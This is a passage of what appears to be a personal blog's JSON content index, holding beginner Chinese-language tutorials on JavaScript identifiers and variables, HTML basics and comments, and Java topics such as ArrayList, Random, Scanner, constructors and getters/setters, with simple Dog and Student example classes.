在JS中所有可以由我们自主命名的都可以称为是标识符. 例如:变量名,函数名,属性名等都属于标识符. 命名一个标识符时需要遵守如下规则: 1.标识符中可以含有字母,数字,下划线_,$ 2.标识符不能以数字开头. 3.标识符不能是ES中的关键字或保留字 4.标识符一般都采用小驼峰式法 -开头首字母小写,往后每个单词的首字母都是大写,其余的都是小写,例如helloWorld -JS底层保存标识符时实际上是采用Unicode的编码,也就是说标识符可以用中文,但不建议这样做.","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS字面常量和变量","slug":"JS00005字面常量和变量","date":"2020-02-13T23:32:00.000Z","updated":"2020-02-14T04:38:55.168Z","comments":true,"path":"2020/02/14/JS00005字面常量和变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00005字面常量和变量/","excerpt":"","text":"JS字面常量和变量 字面常量: 字面常量 都是一些不能改变的值,例如1,2,3,4; 字面常量都是可以直接使用的,但是我们一般不会直接使用; 变量: 变量可以用来保存字面量,而且变量的值是可以任意改变的. 变量在JS中使用var关键字来声明一个变量; 变量声明格式:var 变量名 = 初始值; 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; //声明一个变量 var a; //声明一个变量,并赋初始值 var age = 11; var height = 168.8; //对变量进行修改 age = 14; console.log(age); console.log(height); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS基本语法","slug":"JS00004基本语法","date":"2020-02-13T23:07:44.000Z","updated":"2020-02-14T04:38:50.703Z","comments":true,"path":"2020/02/14/JS00004基本语法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00004基本语法/","excerpt":"","text":"JS基本语法 JS注释 多行注释: 用 /* */ 单行注释: 用 // 注意 1.JS中严格区分大小写 2.JS中每一条语句以分号（ ；）结尾 如果不写分号,浏览器会自动添加,但是会消耗一些系统资源,而且有些时候,浏览器会加错分号,所以在开发中分号必须要写 3.JS中会忽略多个空格和换行，所以我们可以利用空格和换行对代码进行格式化。 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; //年龄 var age = 11; //身高 var height = 168.8; //在控制台上输出年龄 console.log(age); /* 在控制台上输出身高*/ console.log(height); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JavaScript的编写位置","slug":"JS00003JavaScript的编写位置","date":"2020-02-13T16:32:04.000Z","updated":"2020-02-14T04:38:46.177Z","comments":true,"path":"2020/02/14/JS00003JavaScript的编写位置/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00003JavaScript的编写位置/","excerpt":"","text":"JavaScript的编写位置 可以将js代码写在button标签中的onclick属性中 &lt;button onclick=&quot;alert('我爱你');&quot; &gt;点我一下&lt;/button&gt; 可以将js代码写在超链接的href属性中,这样当点击超链接时,就会执行js代码. &lt;a href=&quot;javascript:alert('我太爱你了');&quot;&gt;1234&lt;/a&gt; &lt;a href=&quot;javascript:;&quot;&gt;1234&lt;/a&gt; 可以将js代码写到script标签 ( 推荐使用的方式 ) 123&lt;script type=\"text/javascript\"&gt;/*代码块*/&lt;/script&gt; 可以将js 代码编写到外部js文件中,然后通过script标签引入 外部文件后缀名以.js结尾 js代码写到外部文件中可以在不同的页面中同时引用,也可以利用浏览器的缓存机制. 注意: &lt;Script&gt;标签一旦用于引入外部文件了,就不能再编写代码在标签内部了,即使编写了浏览器也会忽略 如果需要插入其他js代码,则可以再创建一个新的script标签用于编写内部代码 123&lt;script type=\"text/javascript\" src=\"demo001.js\"&gt; &lt;/script&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"第一个JavaScript程序","slug":"JS00002第一个JavaScript程序","date":"2020-02-13T14:43:38.000Z","updated":"2020-02-14T04:38:37.197Z","comments":true,"path":"2020/02/13/JS00002第一个JavaScript程序/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/JS00002第一个JavaScript程序/","excerpt":"","text":"第一个JavaScript程序 JavaScript程序以&lt;script&gt;开头,并以&lt;/script&gt;结尾 &lt;script type=&quot;text/javascript&quot;&gt;等价于&lt;script&gt; 弹出一个警告框:用alert(&quot;内容&quot;);函数 在文本写内容用:document.write(&quot;内容&quot;); 在控制台显示内容用: console.log(&quot;内容&quot;); 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=\"zh\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\" /&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" /&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script&gt; alert(\"我爱你\"); document.write(\"我爱你\"); console.log(\"get out!\"); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JavaScript基础","slug":"JS00001JavaScript基础","date":"2020-02-13T12:57:22.000Z","updated":"2020-02-14T04:41:12.482Z","comments":true,"path":"2020/02/13/JS00001JavaScript基础/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/JS00001JavaScript基础/","excerpt":"","text":"JavaScript基础 起源 JavaScript诞生于1995年,它的出现主要用于处理网页中的前端验证. 所谓的前端验证,就是指检查用户输入的内容是否符合一定的规则. 比如:用户名的长度,密码的长度,邮箱的格式等. 简史 JavaScript是由网景公司发明的,起初命名为LiveScrip,后来由SUN公司的介入更名为了JavaScript. 1996年微软公司在其最新的IE3浏览器中引入了自己对JavaScript的实现JScript. 于是在市面上存在两个版本的JavaScript,一个网景公司的JavaScript和微软的JScript. 为了确保不同的浏览器上运行的JavaScript标准一致,所以几个公司共同定制了JS的标准名命名为ECMAScript. 实现 ECMAScript是一个标准,而这个标准需要由各个厂商去实现. 不同的浏览器厂商对该标准会有不同的实现. 浏览器 JavaScript实现方式 Firefox SpiderMonkey Internet Explorer JScript/Chakra Safari JavaScriptCore Chrome v8 Carakan Carakan 学习JavaScript就是学习三个部分: ECMAScript DOM BOM","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"ArrayList集合的常用方法和遍历","slug":"java00048ArrayList集合的常用方法和遍历","date":"2020-02-13T08:08:58.000Z","updated":"2020-02-13T08:25:48.734Z","comments":true,"path":"2020/02/13/java00048ArrayList集合的常用方法和遍历/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00048ArrayList集合的常用方法和遍历/","excerpt":"","text":"ArrayList集合的常用方法和遍历 public boolean add(E)方法:向集合中添加一个元素 public E remove(int index)方法:在集合中移除一个元素 public E get(int index)方法:获取指定的集合元素 public int size()方法:获取集合的长度 索引从0开始 小技巧: 输入对象数组名.fori再按下tab键,会自动生成一个 1234for(int i = 0 ;i &lt; 对象名.size();i++)&#123;&#125; 123456789101112131415161718192021222324252627import java.util.ArrayList;public class Main14&#123; public static void main(String[] args) &#123; ArrayList&lt;Dog&gt; dog = new ArrayList&lt;&gt;(); //向dog集合添加元素 dog.add(new Dog(\"小黑\",1,\"黑色\")); dog.add(new Dog(\"小黄\",2,\"黄色\")); dog.add(new Dog(\"小白\",3,\"白色\")); dog.add(new Dog(\"小pi\",4,\"黑白色\")); printAll(dog); //移除dog集合中的第2号元素,索引从0开始; dog.remove(2); printAll(dog); &#125; public static void printAll(ArrayList&lt;Dog&gt; dog) &#123; //获取dog集合的长度 for (int i = 0; i &lt; dog.size(); i++) &#123; //获取dog集合中指定第i个元素,从索引0开始 dog.get(i).printAll(); System.out.println(\"============================================\"); &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Dog&#123; private String name;//姓名 private int age;//年龄 private String color;//毛色 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; public void printAll() &#123; System.out.println(\"名字: \" + name); System.out.println(\"年龄 \" + age); System.out.println(\"毛色: \" + color); &#125; //打印所有成员变量&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"ArrayList集合概述和基本使用","slug":"java00047ArrayList集合概述和基本使用","date":"2020-02-13T07:54:03.000Z","updated":"2020-02-13T08:06:57.084Z","comments":true,"path":"2020/02/13/java00047ArrayList集合概述和基本使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00047ArrayList集合概述和基本使用/","excerpt":"","text":"ArrayList集合概述和基本使用 ArrayList集合的长度是可以变化的 在java.util包中 ArrayList有一个尖括号&lt;E&gt;,代表泛型; 泛型也就是代表集合中每一个元素中的类型统一化 ,其中的E要替换为引用类型 注意: 泛型只能是引用类型,不能是基本类型. 在ArrayList类中直接打印对象名字显示的不是地址,而是内容 12345678910111213141516import java.util.ArrayList;public class Main13&#123; public static void main(String[] args) &#123; // ArrayList&lt;String&gt;代表strList集合中的元素全部都是String类型 //new ArrayList&lt;String&gt;() 等价于 new ArrayList&lt;&gt;() //从java1.7开始,右侧的尖括号中的内容可以不写,但是&lt;&gt;本身不能省略 ArrayList&lt;String&gt; strList = new ArrayList&lt;&gt;(); System.out.println(strList);//[] strList.add(\"张无忌\"); strList.add(\"张三丰\"); //直接打印对象名 System.out.println(strList);//[\"张无忌\",\"张三丰\"] &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"对象数组","slug":"java00046对象数组","date":"2020-02-13T07:41:16.000Z","updated":"2020-02-13T07:52:54.312Z","comments":true,"path":"2020/02/13/java00046对象数组/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00046对象数组/","excerpt":"","text":"对象数组 对象数组的创建格式: 第一种方式: 类名[] 对象名 = new 类名[n];其中n代表数组的长度. 第二种方式: 类名[] 对象名 = {new 类名( [初始值] ) ,...,new 类名( [初始值] )} 注意事项: 创建了一个对象数组之后不能直接使用,因为还没有为数组分配对象. 第二种创建的对象数组可以直接使用,因为它一开始就给对象数组分配了对象 1234567891011121314151617181920212223public class Main12&#123; public static void main(String[] args) &#123; //创建对象数组,并对对象数组初始化 Dog[] dogArray = &#123;new Dog(),new Dog(),new Dog(),new Dog()&#125;; dogArray[0].setName(\"小黑\"); dogArray[0].setAge(1); dogArray[0].setColor(\"黑色\"); dogArray[1].setName(\"小白\"); dogArray[1].setAge(1); dogArray[1].setColor(\"白色\"); dogArray[2].setName(\"小黄\"); dogArray[2].setAge(1); dogArray[2].setColor(\"黄色\"); for (int i = 0; i &lt; dogArray.length; i++) &#123; dogArray[i].printAll(); System.out.println(\"=======================\"); &#125; &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445public class Dog&#123; private String name;//姓名 private int age;//年龄 private String color;//毛色 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; public void printAll() &#123; System.out.println(\"名字: \" + name); System.out.println(\"年龄 \" + age); System.out.println(\"毛色: \" + color); &#125; //打印所有成员变量&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java生成一个1-n的随机数","slug":"java00045生成一个1-n的随机数","date":"2020-02-13T02:02:25.000Z","updated":"2020-02-13T02:11:23.967Z","comments":true,"path":"2020/02/13/java00045生成一个1-n的随机数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00045生成一个1-n的随机数/","excerpt":"","text":"生成一个1-n的随机数 思路: 1.定义一个int变量n,随意赋值. 2.要使用Random:三个步骤,导包,创建,使用 3.如果写10,那么就是0~9,然而想要的是1-10,可以发现:整体+1:rand.nextInt(n) + 1既可. 4.打印随机数字. 12345678910111213141516import java.util.Random;public class Main10&#123; public static void main(String[] args) &#123; int n = 5; //第一步 Random rand = new Random();//第二步 for (int i = 0; i &lt; 100; i++) &#123; int num = rand.nextInt(n) + 1; //第三步 System.out.println(num);//第四步 &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Random概述和基本使用","slug":"java00044Random概述和基本使用","date":"2020-02-13T01:36:07.000Z","updated":"2020-02-13T01:54:36.195Z","comments":true,"path":"2020/02/13/java00044Random概述和基本使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00044Random概述和基本使用/","excerpt":"","text":"Random概述和基本使用 Random类是用来生成随机数字的.使用起来也是三个步骤: 1.导包 import java.util.Random 2.创建 Random rand = new Random();一般括号留空即可 3.使用 获取一个随机int数字(范围是int所有范围,有正负两种) int num = rand.nextInt(); 获取一个指定范围的随机int数字(获取范围: [ 0 ,int ) 闭合区间 ) 打印范围是0 ~ (int -1) int num = rand.nextInt(int); 1234567891011121314import java.util.Random;public class Main09&#123; public static void main(String[] args) &#123; Random rand = new Random(); //范围是负的int最大值~正的int最大值 System.out.println(\"随机数是: \" + rand.nextInt()); for(int i = 0; i &lt; 100; i++) &#123; System.out.println(rand.nextInt(100)); // 打印范围是0~99 &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"匿名对象作为方法的参数及返回值","slug":"java00043匿名对象作为方法的参数及返回值","date":"2020-02-13T01:06:43.000Z","updated":"2020-02-13T01:21:31.332Z","comments":true,"path":"2020/02/13/java00043匿名对象作为方法的参数及返回值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00043匿名对象作为方法的参数及返回值/","excerpt":"","text":"匿名对象作为方法的参数及返回值 快速生成局部变量的快捷键: 想快速生成一个 Dog dog = new Dog();的局部变量只需要输入new Dog(); 并按下ALT + Entter 1234567891011121314151617181920212223import java.util.Scanner;public class Main08&#123; public static void main(String[] args) &#123; scanInt(new Scanner(System.in)); Dog dog = reDog(\"小黑\", 1, \"黑色\"); System.out.println(\"=====================================\"); dog.printAll(); &#125; //使用匿名对象作为参数 public static void scanInt(Scanner sc)&#123; System.out.println(\"请输入一个数: \"); int num = sc.nextInt(); System.out.println(\"你输入的数是: \" + num); &#125; //使用匿名对象作为返回值 public static Dog reDog(String name,int age,String color)&#123; return new Dog(name,age,color); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Dog&#123; private String name;//姓名 private int age;//年龄 private String color;//毛色 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; public void printAll() &#123; System.out.println(\"名字: \" + name); System.out.println(\"年龄 \" + age); System.out.println(\"毛色: \" + color); &#125; //打印所有成员变量&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"匿名对象的说明","slug":"java00042匿名对象的说明","date":"2020-02-13T00:52:33.000Z","updated":"2020-02-13T01:05:22.186Z","comments":true,"path":"2020/02/13/java00042匿名对象的说明/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00042匿名对象的说明/","excerpt":"","text":"匿名对象的说明 没有名称的对象称为匿名对象,格式: new 类名(); 可以直接使用匿名对象来调用类方法,格式: new 类名().方法名(); 注意事项: 匿名对象只能使用一次,下次继续使用需要从新new一个,原来那个会自动回收掉. 1234567891011121314151617import java.util.Scanner;public class Main07&#123; public static void main(String[] args) &#123; System.out.print(\"请输入一个数:\"); int num = new Scanner(System.in).nextInt();//我是匿名对象 new Dog(\"小黄\",1,\"黄色\").printAll();//我是匿名对象 System.out.println(\"==================================\"); new Dog(\"小黑\",2,\"黑白\").printAll();//我是匿名对象 &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Dog&#123; private String name;//姓名 private int age;//年龄 private String color;//毛色 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; public void printAll() &#123; System.out.println(\"名字: \" + name); System.out.println(\"年龄 \" + age); System.out.println(\"毛色: \" + color); &#125; //打印所有成员变量&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"标签的属性","slug":"html-css00003标签的属性","date":"2020-02-12T14:25:03.000Z","updated":"2020-02-12T14:32:41.990Z","comments":true,"path":"2020/02/12/html-css00003标签的属性/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/html-css00003标签的属性/","excerpt":"","text":"标签的属性 属性: 可以通过属性来设置标签如何处理标签中的内容 在开始标签中添加属性 属性需要写在开始标签中,实际上就是一个名值对的结构 属性名 = &quot;属性值&quot;,一个标签中可以同时设置多个属性,属性之间需要使用空格隔开 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;!-- 我是注释--&gt;&lt;body&gt; &lt;h1&gt; &lt;!--通过font标签中的color属性来改变字体颜色--&gt; &lt;font color=\"red\"&gt;第一个&lt;/font&gt;网站 &lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"HTML注释","slug":"html-css00002HTML注释","date":"2020-02-12T14:17:06.000Z","updated":"2020-02-12T14:20:28.931Z","comments":true,"path":"2020/02/12/html-css00002HTML注释/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/html-css00002HTML注释/","excerpt":"","text":"HTML注释 有时候需要对程序的说明,这时候就需要用到注释. 注释语法: &lt;!-- 内容 --&gt; 1234567891011&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;!-- 我是注释--&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"HTML/CSS基础","slug":"html-css00001HTML-CSS基础","date":"2020-02-12T13:45:47.000Z","updated":"2020-02-12T14:15:33.801Z","comments":true,"path":"2020/02/12/html-css00001HTML-CSS基础/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/html-css00001HTML-CSS基础/","excerpt":"","text":"HTML/CSS基础 软件架构 C/S,客户端/服务器端 1.一般我们使用的软件都是C/S架构 2.比如系统中的软件QQ,360,office等等 3.C表示客户端,用户通过客户端来使用软件 4.S表示服务器,服务器负责处理软件的业务逻辑 特点: 1.软件使用前必须得安装 2.软件更新时,服务器和客户端得同时更新 3.C/S架构的软件不能跨平台使用 4.C/S架构的软件客户端和服务器通信采用的是自有协议,相对来说比较安全 B/S,浏览器/服务器 1.B/S本质上也是C/S,只不过B/S架构的软件,使用浏览器作为软件客户端 2.B/S架构软件通过使用浏览器访问网页的形式,来使用软件,比如:京东,淘宝,知乎等等 特点: 1.软件不需要安装,直接使用浏览器访问指定的网址即可 2.软件更新时,客户端不需要更新 3.软件可以跨平台,只要系统中有浏览器,就可以使用. 4.B/S架构的软件,客户端和服务器之间通信采用的是通用的HTTP协议,相对来说不安全,一般采取https协议 W3C标准: 一个网页主要由三部分组成:结构,表现,行为. 结构:对应的是html ,用于描述页面的结构 表现:对应的是CSS, 用于控制页面中元素的样式 行为:对应的是JavaScript , 用于响应用户操作 HTML简介 HTML(Hypertext Markup Language) 超文本标记语言 负责网页的三个要素中的结构 HTML使用标签的形式来标识网页中的不同组成部分 所谓超文本指的是超链接,使用超链接可以让我们从一个页面跳转到另一个页面. 扩展名: .html 标准格式: 12345678910&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"Scanner的概述及使用","slug":"java00041Scanner的概述及使用","date":"2020-02-12T11:46:36.000Z","updated":"2020-02-13T00:32:13.072Z","comments":true,"path":"2020/02/12/java00041Scanner的概述及使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/java00041Scanner的概述及使用/","excerpt":"","text":"Scanner类的功能,可以实现键盘输入数据,到程序当中. 包路径:import java.util.Scanner; 使用步骤: 1 . 导包 import 包路径.类名称; 如果需要使用的目标类,和当前类位于同一个包下,则可以省略导包语句不写. 在java.lang包下的内容不需要导包,其他的包都需要import语句; 在集成环境中输入Scanner按下回车会自动进行导包; 2.创建 类名称 对象名 = new 类名称(); 3.使用 对象名.成员方法名() 获取键盘输入的一个int数字,int num = sc.nextInt(); 获取键盘输入的一串字符串: String str = sc.next(); 123456789101112131415161718192021222324252627//导包import java.util.Scanner;public class Main04&#123; public static void main(String[] args) &#123; Dog dog = new Dog(); //创建一个Scanner类 Scanner sc = new Scanner(System.in); System.out.println(\"请输入名字: \"); //输入一个字符串 dog.setName(sc.next()); System.out.println(\"请输入年龄: \"); //输入一个整数 dog.setAge(sc.nextInt()); System.out.println(\"请输入毛色: \"); //输入一个字符串 dog.setColor(sc.next()); System.out.println(\"==============================\"); dog.printAll(); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Dog&#123; private String name;//姓名 private int age;//年龄 private String color;//毛色 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; public void printAll() &#123; System.out.println(\"名字: \" + name); System.out.println(\"年龄 \" + age); System.out.println(\"毛色: \" + color); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"定义一个标准的类和自动生成构造函数与setter方法/getter方法","slug":"java00040定义一个标准的类和自动生成构造函数与setter方法-getter方法","date":"2020-02-12T00:33:34.000Z","updated":"2020-02-12T00:52:06.153Z","comments":true,"path":"2020/02/12/java00040定义一个标准的类和自动生成构造函数与setter方法-getter方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/java00040定义一个标准的类和自动生成构造函数与setter方法-getter方法/","excerpt":"","text":"定义一个标准的类和自动生成构造函数与setter方法/getter方法 一个标准的类 通常有四个部分组成: 所有的成员变量都要使用private关键字修饰 为每一个成员变量编写一对Getter/Setter方法 编写一个无参数的构造方法 编写一个全参数的构造方法 这样标准的类也叫做Java Bean 自动生成构造函数与setter方法/getter方法 通常定义一个标准的类只需要写私有成员变量就行了,其余部分交由编译器去生成. 生成所有私有变量的setter方法/getter 快捷键 : alt + insert 生成所有setter方法/getter方法 生成空构造函数 生成全参造函数 12345678910111213141516171819public class Main03&#123; public static void main(String[] args) &#123; //使用默认构造函数 Dog dog1 = new Dog(); dog1.setName(\"bobo\"); dog1.setAge(2); dog1.setColor(\"white\"); System.out.println(\"姓名: \" + dog1.getName() + \" 年龄: \" + dog1.getAge() + \" 毛色: \" + dog1.getColor()); System.out.println(\"====================\"); //使用全参构造函数 Dog dog2 = new Dog(\"copi\",1,\"blackAndYellow\"); //使用getter方法 System.out.println(\"姓名: \" + dog2.getName() + \" 年龄: \" + dog2.getAge() + \" 毛色: \" + dog2.getColor()); //使用setter方法 dog2.setAge(2); System.out.println(\"姓名: \" + dog2.getName() + \" 年龄: \" + dog2.getAge() + \" 毛色: \" + dog2.getColor()); &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142public class Dog&#123; private String name;//姓名 private int age;//年龄 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; private String color;//毛色&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"构造方法","slug":"java00039构造方法","date":"2020-02-12T00:16:02.000Z","updated":"2020-02-12T00:31:58.939Z","comments":true,"path":"2020/02/12/java00039构造方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/java00039构造方法/","excerpt":"","text":"构造方法 构造方法是专门用来创建对象的方法,当我们通过关键字new来创建对象时,其实就是在调用构造方法. 构造方法的定义格式: public 类名称( [参数类型 参数名称 , ........] ){ 方法体 } 注意事项: 构造方法的名称必须和所在的类名称完全一样,就连大小写也要一样 构造方法不要写返回值类型,连void都不用写 构造方法不能return一个具体的返回值 如果没有编写如何构造方法,那么编译器将会默认定义一个空构造方法: public 类名 (){}; 一旦编写了至少一个构造方法,那么编译器将不再提供默认的构造方法. 构造方法也是可以重载的. 重载:方法名相同,参数列表不同; 12345678910111213141516public class Main02&#123; public static void main(String[] args) &#123; //默认构造函数 Student student1 = new Student(); //全参构造函数 Student student2 = new Student(\"赵敏\",20); System.out.println(\"姓名: \" + student2.getName() + \"年龄: \" + student2.getAge()); //修改年龄 student2.setAge(21); System.out.println(\"姓名: \" + student2.getName() + \"年龄: \" + student2.getAge()); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334public class Student&#123; //私有成员变量 private String name; private int age; //无参构造方法 Student()&#123; System.out.println(\"无参构造方法被调用\"); &#125;; //全参构造方法 Student(String name,int age)&#123; this.name = name; this.age = age; &#125; //设置name public void setName(String name)&#123; this.name = name; &#125; //获取name public String getName()&#123; return this.name; &#125; //设置age public void setAge(int age) &#123; this.age = age; &#125; //获取age public int getAge()&#123; return this.age; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"this关键字","slug":"java00038this关键字","date":"2020-02-12T00:09:38.000Z","updated":"2020-02-12T00:14:15.293Z","comments":true,"path":"2020/02/12/java00038this关键字/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/java00038this关键字/","excerpt":"","text":"this关键字 当方法的局部变量和类的成员变量重名时,工具&quot;就近原则&quot;,优先使用局部变量. 如果需要访问本类的当中的成员变量,需要使用格式: this.变量名 通过谁调用的方法,谁就是this. 12345678public class Main01&#123; public static void main(String[] args) &#123; Person person = new Person(); person.name = \"王思聪\"; person.printWho(\"王健林\"); &#125;&#125; 123456789public class Person&#123; public String name; public void printWho(String name) &#123; //局部变量name和成员变量name重名,所以用this区分 System.out.println(\"你好,我是\" + name + \"\\n你好,我是\" + this.name); // \\n是换行符 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"类方法中的boolean类型的get方法规则","slug":"java00037类方法中的boolean类型的get方法规则","date":"2020-02-11T22:48:52.000Z","updated":"2020-02-11T22:58:19.310Z","comments":true,"path":"2020/02/12/java00037类方法中的boolean类型的get方法规则/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/java00037类方法中的boolean类型的get方法规则/","excerpt":"","text":"类方法中的boolean类型的get方法规则 如果类中boolean类型的成员变量是private的,写get方法时的格式一定要是: 以is开头,后面紧跟着变量名,变量名首字符一定要大写 public boolean isXxxx() { return (boolean类型变量); } 如果是``boolean类型的成员变量是private,写set`方法时,按普通写法: public void setXxxx( boolean m_Xxxx) { Xxxx = m_Xxxx; } 1234567891011121314public class Main02&#123; public static void main(String[] args) &#123; Student student = new Student(); student.setName(\"小昭\"); //设置姓名 student.setAge(18);//设置年龄 student.setMale(false);//设置性别 System.out.println(student.getName());//获取姓名 System.out.println(student.getAge());//获取年龄 System.out.println(\"是否是男的: \" + student.isMale());//获取性别 &#125;&#125; 12345678910111213141516171819202122232425262728public class Student&#123; private String name;//学生姓名 private 